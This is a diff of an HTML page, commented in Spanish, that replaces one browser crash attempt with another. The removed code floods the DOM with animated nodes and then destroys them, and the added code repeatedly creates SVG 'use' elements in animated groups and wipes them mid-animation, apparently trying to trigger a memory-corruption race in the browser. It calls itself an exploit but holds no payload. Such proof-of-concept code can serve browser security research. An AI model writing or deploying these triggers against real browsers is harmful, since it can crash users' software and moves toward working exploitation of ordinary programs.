@@ -2,49 +2,44 @@
 <html>
 <head>
 <style>
-@keyframes boom {
-  from { opacity: 1; }
-  to { opacity: 0; }
+@keyframes crash {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
 }
 </style>
 </head>
 <body>
-<div id="log" style="color:white;background:#111;padding:1em;">Running exploit...</div>
+<svg id="svg" width="100" height="100"></svg>
+<div id="log" style="background:#111;color:#0f0;font-family:monospace;padding:1em;">Cargando exploit...</div>
 
 <script>
-let parent = document.createElement("div");
-document.body.appendChild(parent);
+const svg = document.getElementById("svg");
+const log = document.getElementById("log");
 
-let target = document.createElement("div");
-target.style.animation = "boom 0.1ms infinite";
-parent.appendChild(target);
+function createMaliciousElement() {
+    let g = document.createElementNS("http://www.w3.org/2000/svg", "g");
+    g.setAttribute("transform", "translate(0,0)");
 
-let frame = 0;
+    let use = document.createElementNS("http://www.w3.org/2000/svg", "use");
+    use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target");
 
-function sprayDOM() {
-    try {
-        // Saturamos el heap con nodos animados
-        for (let i = 0; i < 1000; i++) {
-            let clone = target.cloneNode(true);
-            parent.appendChild(clone);
-        }
+    g.appendChild(use);
+    svg.appendChild(g);
 
-        // Forzamos destrucción
-        while (parent.firstChild) {
-            parent.removeChild(parent.firstChild);
-        }
-    } catch (e) {
-        log.textContent = "❌ Error: " + e.message;
-    }
-
-    if (frame++ < 1000) {
-        requestAnimationFrame(sprayDOM);
-    } else {
-        log.textContent = "✅ No crash (try deeper corruption)";
-    }
+    // Animación forzada
+    g.style.animation = "crash 0.1ms infinite";
 }
 
-requestAnimationFrame(sprayDOM);
+function triggerRace() {
+    for (let i = 0; i < 1000; i++) {
+        createMaliciousElement();
+        svg.innerHTML = ""; // destruir nodos en medio de la animación
+    }
+
+    requestAnimationFrame(triggerRace);
+}
+
+triggerRace();
 </script>
 </body>
 </html>
